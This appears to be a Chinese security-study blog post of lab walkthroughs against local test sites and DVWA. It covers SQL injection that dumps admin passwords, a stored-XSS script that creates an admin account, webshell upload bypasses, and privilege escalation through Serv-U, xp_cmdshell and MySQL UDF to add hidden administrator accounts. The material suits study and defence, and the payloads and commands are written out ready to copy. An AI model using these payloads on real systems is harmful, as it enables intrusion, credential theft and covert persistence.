---
title: web安全
tags: web安全
categories: 网络安全
top_img: 'https://cdn.jsdelivr.net/npm/nan-picture/img/wp1.jpg'
cover: 'https://cdn.jsdelivr.net/npm/nan-picture/img/wp1.jpg'
abbrlink: 4b61
date: 2020-07-22 16:00:00
updated: 2020-07-22 16:00:00
---
# SQL注入技术

***

## 判断是字符型注入还是数字注入

### 1、数字型注入

当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。

测试步骤：

（1） 加单引号，URL：[www.text.com/text.php?id=3](http://www.text.com/text.php?id=3)’

对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；

（2） 加and 1=1 ,URL：[www.text.com/text.php?id=3](http://www.text.com/text.php?id=3) and 1=1

对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；

（3） 加and 1=2，URL：[www.text.com/text.php?id=3](http://www.text.com/text.php?id=3) and 1=2

对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异

如果满足以上三点，则可以判断该URL存在数字型注入。

### 2、字符型注入

当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。

例如数字型语句：select * from table where id =3

则字符型如下：select * from table where name=’admin’

因此，在构造payload时通过闭合单引号可以成功执行语句：

测试步骤：

（1） 加单引号：select * from table where name=’admin’’

由于加单引号后变成两个单引号，则无法执行，程序会报错；

（2） 加 admin’ and 1=1， 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；

Mysql 有三种常用注释符：

​	-- 注意，这种注释符后边有一个空格

​	# 通过#进行注释

​	/* */ 注释掉符号内的内容

因此，构造语句为：select * from table where name =’admin’ and 1=1-- ’ 可成功执行返回结果正确；

（3） 加admin' and 1=2-- ，此时sql语句为：select * from table where name=’admin’ and 1=2 -- ’则会报错

如果满足以上三点，可以判断该url为字符型注入。



## 手工注入access数据库

**方法：**

> **一、判断网站是否有注入漏洞**
>
> 1.选择一个链接【`http://192.168.1.3:8008/onews.asp?id=45`】,Get传参
>
> 2.测试链接，在链接末尾添加【’】，返回页面错误。
>
> 3.在链接末尾添加【 and 1=1】，返回页面正确。
>
> 4.在链接末尾添加【and 1=2】，返回页面错误，此时表明该网站存在注入漏洞。
>
> **二、猜解表名和列名**
>
> 1.在链接末尾添加语句【and exists(select * from admin)】，页面正常显示，说明存在表名【admin】。
>
> 2.在连接末尾添加语句【and exists(select admin from admin)】，页面正常显示，即在表中存在admin列。
>
> 3.在链接末尾添加语句【and exists(select password from admin)】，页面正常显示，即存在password列。
>
> **三、猜测字段内容**
>
> 1.猜测字段的长度，在链接末尾添加语句【and (select **top 1** len (admin) from admin)>**5**】，页面显示错误，说明**字段长度为5**。这个语句表示在表admin里面猜解**第一行**的admin列的长度。
>
> 2.猜测字段的内容，在链接末尾添加语句【and (select top 1 asc(mid(admin,1,1)) from admin)>97】，页面显示错误，可猜解出第一条记录的第一位字符的ASCII码为97，对应a。
>
> ```sql
> SQL MID() 函数：MID(column_name,start[,length])
> 参数	        描述
> column_name	 必需。要提取字符的字段。
> start	     必需。规定开始位置（起始值是 1）。
> length	     可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。
> ```
>
> 3.逐渐猜解，在链接末尾添加语句【and (select top 1 asc(mid(admin,2,1)) from admin)>97】，猜解第二个字符的内容。密码猜测同理。



## 手工联合查询注入技术

**方法：**

>1.在链接后面添加语句【order by 11（数字任意）】，根据页面返回结果，来判断站点中的字段数目。
>
>如：【order by 11】页面显示正确，【order by 12】页面显示错误，说明站点有11个字段。
>
>2.在链接后面添加语句【union select 1,2,3,4,5,6,7,8,9,10,11 from admin（表名）】，进行联合查询，来暴露可查询的字段编号。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214929.png)
>
>3.在链接后面添加语句【union select 1,admin,password,4,5,6,7,8,9,10,11 from admin】，即可暴出管理员用户名和密码。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214853.png)



## 万能密码注入

**原理：**

> 前提：网站后台在进行数据库查询的时候没有对单引号进行过滤
>
> 1.当用户登录时，后台执行的数据库查询操作（SQL语句）是
>
>  【Select user_id,user_type,email From users Where user_id=’用户名’ And password=’密码’】。
>
> 2.当输入用户名【admin】和万能密码【2’or’1】时，执行的SQL语句为
>
>  【Select user_id,user_type,email From users Where user_id=’admin’ And password=’2’or’1’】。
>
> 3.由于SQL语句中逻辑运算符具有优先级，【=】优先于【and】，【and】优先于【or】，且适用传递性。
>
> 4.因此，此SQL语句在后台解析时，分成两句
>
>  【Select user_id,user_type,email From users Where user_id=’admin’ And password=’2’】和【’1’】，
>
>    两句bool值进行逻辑or运算，恒为TRUE。



## DVWA之php+mysql手工注入

### 1.低安全等级文件包含

**实验步骤：**

>1.提示输入User ID，输入正确的ID，将显示 ID First name（名），Surname（姓）信息。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214908.png)
>
>2.尝试输入’，返回错误，可以得知此处为注入点。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214916.png)
>
>3.尝试输入：`1 or 1=1`,想要遍历数据库表，并没有达成目的，猜测程序将此处看成了**字符型**。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214858.png)
>
>4.尝试输入：`1’ or’ 1’=’1`后遍历出了数据库中的所有内容。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214932.png)
>
>5.利用order by num语句来测试数据表有多少个字段。（--加空格）表示注释掉sql语句末尾的单引号。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214851.png)
>
>6.当输入3是，页面报错。页面错误信息如下，Unknown column ‘3’ in ‘order clause’，由此我们判断查询结果值为2列。
>
>7.注入：``1' and 1=2 union select 1,2 --`由图得知，First name处显示为查询结果第一列的值，Surname处显示为查询结果第二列的值。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214857.png)
>
>8.通过注入：`1' and 1=2 union select user(),database() --`得到数据库用户以及数据库名称。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214919.png)
>
>9.通过注入：`1' and 1=2 union select version(),database() -- `得到数据库版本信息。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214930.png)
>
>10.通过注入：
>
>```
>1'and 1=2 union select 1,@@global.version_compile_os from mysql.user --
>```
>
>获得操作系统信息。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214936.png)
>
>11.通过注入：`1' and 1=2 union select 1,schema_name from information_schema.schemata -- `查询所有数据库名字。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214855.png)
>
>12.通过注入：`1' and exists(select * from 表名) --`猜解dvwa数据库中的表名。测试表名为users。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214903.png)
>
>13.猜解字段名：`1' and exists(select 表名 from users) --`,测试的字段名为first_name,last_name。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214856.png)
>
>14.爆出数据库中字段的内容`1' and 1=2 union select first_name,last_name from users --`,这里其实如果是存放管理员账户的表，那么用户名，密码信息字段就可以爆出来了。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214935.png)

**源码分析：**

![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214904.png)

>通过代码可以看出，对输入$id的值没有进行任何过滤就直接放入了SQL语句中进行处理，这样带来了极大的隐患。

### 2.中安全等级代码分析

**源码分析：**

![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214937.png)

>通过源代码可以看出，在中等级别时对输入的$id的值使用mysql_real_eascape_string()函数进行了处理。在PHP中，使用mysql_real_escape_string()函数用来转义SQL语句中使用字符串的特殊字符。但是使用这个函数对参数进行转换是存在绕过的。只需要将攻击字符进行转换一下编码格式即可绕过该防护函数。比如使用url编码等方式。同时发现SQL语句中变成了“WHERE user_id = $id”，此处变成了**数字型**注入，所以此处使用mysql_real_escape_string()函数并没有起到防护的作用。可以通过类似于“1 or 1= 1”的语句来进行注入。

### 3.高安全等级代码分析

**源码分析：**

![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214927.png)

>从源代码中可以看出，此处认为**字符型**注入。对传入$id的值使用stripslashes()函数处理以后，在经过到$mysql_real_escape_string()函数进行第二次过滤。在默认情况下，PHP会对所有的GET，POST和cookie数据自动运行addslashes()，adslashers()函数返回在预定义字符之前添加反斜杠的字符串。就是将“’”变成“\’”，Stripslashes()函数则是删除由addslashes()函数添加的反斜杠。在使用两个函数进行过滤之后再使用is_numric()函数检查$id的值是否为数字，彻底断绝了注入的存在。此种防护不存在绕过的可能。





# 跨站脚本技术

***

## Csrf利用管理员权限创建后台管理账户

**原理：**通过普通用户的存储型XSS实现创建管理员账户的CSRF利用

**实验步骤：**

>1.注册一个用户。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706215643.png)
>
>2.来到“添加物品”处。此处是存在存储型XSS的。添加以下信息，点击“提交”。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706215644.png)
>
>3.点击“首页”，看到刚才添加的物品信息，点击打开。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706215649.png)
>
>4.弹出信息。说明漏洞存在。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706215645.png)
>
>5.再次编辑“添加物品”处提交的内容，其中“物品简介”项的内容如下：
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706215646.png)
>
>```javascript
><script type="text/javascript">
>function loadXMLDoc()
>{
>var xmlhttp;
>if (window.XMLHttpRequest)
>  {// code for IE7+, Firefox, Chrome, Opera, Safari
>  xmlhttp=new XMLHttpRequest();
>  }
>else
>  {// code for IE6, IE5
>  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
>  }
>xmlhttp.onreadystatechange=function()
>  {
>  if (xmlhttp.readyState==4 && xmlhttp.status==200)
>    {
>    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
>    }
>  }
>xmlhttp.open("POST"," http://192.168.1.3:8007/admin/admin_usersetting.asp",true);
>xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
>xmlhttp.send("action=add&UserName=zhangsan&PassWord=123456&isActive=1&isAdmin=1&pubSubCateID=91&Submit=+%C8%B7+%B6%A8+");
>}
>loadXMLDoc()
></script>
>```
>
>6.点击“首页”，回到首页，退出zhangsan用户。
>
>7.输入后台路径`【http://192.168.1.3:8007/admin/user.asp】`使用【admin/admin888】，登录后台。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706215647.png)
>
>8.此时回到首页，浏览器输入：`http://192.168.1.3:8007`，查看帖子rty，点击了此条物品消息，没有什么异常现象。
>
>9.此时管理员再次进入自己的后台：`【http://192.168.1.3:8007/admin/user.asp】`在“系统用户管理”中，发现多了一个账户zhangsan。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706215648.png)



## 跨站脚本攻击之存储型XSS

**实验步骤：**

>1.由于对用户的输入过滤不严导致XSS，所以一般XSS会存在在交互页面,比如留言板、登录框等。点击【在线留言】，进入在线留言页面。
>
>2.在交互页面提交请求，进行尝试输入不同的内容，寻找XSS漏洞存在的点。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214912.png)
>
>3.交互界面返回信息。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214910.png)
>
>4.经过页面提交留言测试，发现留言标题文本框对输入的文字长度进行了限制,所以,我们的这一次尝试是失败的，我们需要调整XSS代码以绕过防护。
>
>5.这里使用注释的方式绕过代码对长度的限制。对交互页面进行输入恶意代码。我们先尝试提交`*/</script>`点击提交。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706215650.png)
>
>6.显示提交成功，我们继续提交下一段代码`<script>alert(/xss/)/*`来配合上一段代码执行。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214900.png)
>
>7.当管理员进入管理后台，进入留言管理，会触发用户输入的恶意代码，成功弹窗。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214859.png)
>
>8.后台页面源代码里显示`<script>alert(/xss/)/*其他标签和内容``*/</script>`





# webshell上传

***

## 绕过前台脚本检测扩展名上传webshell

**原理：**

> 当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。

**方法：**

> 绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。



## 绕过Content-Type检测文件类型上传

**原理：**

>当浏览器在上传文件到服务器的时候，服务器对上传文件的Content-Type类型进行检测，如果是白名单允许的，则可以正常上传，否则上传失败。

**方法：**

> 绕过Content—Type文件类型检测，就是用BurpSuite截取并修改数据包中文件的Content-Type类型，使其符合白名单的规则，达到上传的目的。



## 绕过服务器端扩展名检测上传

**原理：**

>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。

**方法：**

> 本实例中，将一句话木马的文件名【lubr.php】，改成【lubr.php.abc】。首先，服务器验证文件扩展名的时候，验证的是【.abc】，只要该扩展名符合服务器端黑白名单规则，即可上传。另外，当在浏览器端访问该文件时，Apache如果解析不了【.abc】扩展名，会向前寻找可解析的扩展名，即【.php】。一句话木马可以被解析，即可通过中国菜刀连接。



## 利用00截断上传webshell

**原理：**

>利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。
>假设文件的上传路径为【`http://xx.xx.xx.xx/upfiles/lubr.php.jpg`】，通过抓包截断将【lubr.php】后面的【.】换成【0x00】。在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束，从而将【lubr.php.jpg】的内容写入到【lubr.php】中，从而达到攻击的目的。

**方法：**

>将木马文件（lubr.php）的后缀名【.php】改为【.php.jpg】，点击【上传】。
>
>在BurpSuite中会抓到截取的数据包，点击【hex】，进入到十六进制源码界面。
>
>找到【lubr.php.jpg】对应的十六进制源码，将【lubr.php】后【.】对应的【2e】改为【00】。



## 构造图片木马，绕过文件内容检测上传Shell

**原理：**

>一般文件内容验证使用getweb安全ize()函数检测，会判断文件是否是一个有效的文件图片，如果是，则允许上传，否则的话不允许上传。

**方法：**

> 将一句话木马插入到一个【合法】的图片文件当中。
>
> 1. 随便找一个图片，与所要上传的木马放置于同一文件夹下。
> 2. 打开cmd，进入木马所在文件夹。
> 3.  输入copy `pic.jpg/b+lubr.php/a` PicLubr.jpg ，将【lubr.php】插入到【pic.jpg】中。其中 /b表示以二进制合并， /a表示以ascii合并。而【PicLubr.jpg】就是我们需要上传的图片木马。



## 南方企业内容管理系统漏洞

**原理：**

>数据库备份拿webshell

**方法：**

> 1.在【荣誉管理】选项卡下，选择【添加企业荣誉】，即可弹出可上传文件页面。
>
> 2.将木马文件【1.asp】改成【1.jpg】，点击上传。
>
> ![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214917.png)
>
> 3.打开【系统管理】下的【数据库备份】，即可进入数据库备份页面，并将刚刚得到的木马文件的路径复制到当前数据库路径中，填写数据库备份名称【ok.asp】。
>
> ![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214934.png)
>
> 4.点击【确定】，即可得到数据库备份的路径【admin\Databackup\ok.asp.asa】。
>
> ![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214852.png)
>
> 5.在火狐浏览器的地址栏中输入完整路径【`http://192.168.1.3:8002/admin/Databackup/ok.asp`】，即可访问木马，已经成功拿到webshell（密码：123456）。
>
> ![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214933.png)



## Fckeditor漏洞上传webshell

**原理：**

> Fckeditor在2.4.2以下存在一个直接上传任意文件的上传页面，可直接上传webshell。
>
> 此版本fckeditor存在两个上传漏洞页面：
> （1）FCKeditor/editor/filemanager/browser/default/browser.html？type=Image&connector=connectors/asp/connector.asp
> （2）FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp？Command=GetFoldersAndFiles&Type=zhang&CurrentFolder=/
>
> 第一个页面是在网站根目录下的userfiles目录下的Image目录下打开一个上传页面，上传的文件都保存在这个目录下；第二个页面是在网站根目录下的userfiles目录下创建一个zhang目录。

**方法：**

> 1.打开网站(`http://192.168.1.3:8001/fckeditor`)判断是否有fckeditor编辑器，出现403禁止访问，说明此目录存在。
>
> ![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214914.png)
>
> 2.判断fckeditor编辑器版本号，输入：`http://192.168.1.3:8001/FCKeditor/_whatsnew.html`，由返回页面可知此fckeditor编辑器版本为2.0。
>
> ![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214931.png)
>
> 3.打开`http://192.168.1.3:8001/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp`
>
> 4.经测试jpg后缀文件可上传，asp后缀文件被拦截。所以我们把文件重命名为2.asp.jpg。并利用00截断上传shell。
>
> ![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214913.png)





# 基于webshell提权

***

## server-u提权

**原理：**

> 通过webshell读取server-u配置文件，修改配置，添加系统用户。

**方法：**

>1.在浏览器中输入http://192.168.1.3:8000/webshell.asp，输入默认密码（123456）。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214906.png)
>
>2.单击“执行—CMD”, 在右侧中选上复选框“wscript.shell”在输入空中输入命令“netstat -an”,单击执行按钮。利用webshell读取服务器信息，发现服务器系统安装server-u服务,默认端口号**43958**。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214911.png)
>
>3.单击“Servu-提权”按钮，在命令栏中输入“cmd /c net user aaa 123456 /add & net localgroup administrators aaa /add”，单击提交按钮。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214854.png)
>
>4.单击“用户——帐号”选项，显示用户aaa已成功添加到系统。
>
>5.单击“开始”->“运行“->输入”cmd”，在命令行下输入“mstsc”。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214922.png)
>
>6.输入新添加的账号aaa，输入密码“123456”，单击确定，远程连接到目标主机。

 **扩展：**在命令行下建立隐藏用户：“net user abc$ /add”。 abc是建立的用户名，$符号是表示在dos下面隐藏。



## MSSqlserver xp_cmdshell提权

**原理：**

> 通过webshell读取网站数据库连接配置文件，获取数据库连接密码。
>
> 通过webshell上用xp_cmdshell添加系统帐号。

**方法：**

>1. 在浏览器中输入http://192.168.1.3:8000/2.asp ，输入默认密码（123456）。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214901.png)
>
>2. 单击“端口扫描”->“开始扫描”, 发现**1433**端口开放，安装有mssql数据库。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214918.png)
>
>3. 单击“数据库操作”，在右侧下拉列表mssql连接，输入相应的数据库名称master，密码123456。
>
>  在SQL操作命令中输入“select count(*) from master.dbo.sysobjects where xtype = ‘x’ and name = ‘xp_cmdshell’”，查看cmd_shell是否开启。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214925.png)
>
>4. 命令回显为1，cmd_shell为开启。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214909.png)
>
>5. 添加系统账号,在SQL操作命令中输入“Exec master.dbo.xp_cmdshell ‘net user hacker 123456 /add’”，没有回显表示命令成功。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214905.png)
>
>6. 在SQL操作命令中输入” Exec master.dbo.xp_cmdshell ‘net localgroup administrators hacker /add’ “将hacker加入管理员组。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214926.png)
>
>7. 单击”scan”按钮，查看端口号。发现3389端口开启着。 *3389*是远程协助的端口。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214907.png)
>
>8.  单击“开始”—>“运行”—>输入“mstsc”,用新加的用户hacker（账号hacker 密码123456）连接服务器（192.168.1.3）远程桌面。



## MysqlUDF提权

**原理：**

>通过webshell读取网站数据库连接配置文件，获取数据库连接密码。
>
>通过webshell上传mysql-udf文件，添加系统用户。

**方法：**

>1.在浏览器中输入http://192.168.1.3:8080/webshell.php ，输入默认密码（admin）。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214902.png)
>
>2.单击“端口扫描”->“开始扫描”, 发现**3306**端口开放，安装有Mysql数据库。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214915.png)
>
>3.利用Mysql_udf提权，单击“mysql-udf提权”，在右侧输入已知的数据库连接用户名和密码（root:123456）,然后单击MYSQL连接即可。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214921.png)
>
>4.单击“安装DLL”按钮。
>
>5.在下拉列表框中选择”添加管理员”,单击”执行”按钮。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214924.png)
>
>6.在下拉列表框中选择”设为管理组”,单击”执行”按钮并加入管理员组。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214928.png)
>
>7.选择菜单栏中的“CMD命令”，下拉列表框中选择“net user”,然后单击“执行按钮”。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214923.png)
>
>8.选择菜单栏中的“CMD命令”，下拉列表框中选择“netstat -an”,然后单击“执行按钮”。
>
>![](https://cdn.jsdelivr.net/npm/nan-picture/blog/20220706214920.png)
>
>9.单击开始—>运行—>输入“mstsc”—>”192.168.1.3”,用新加的用户spider密码spider连接服务器远程桌面。

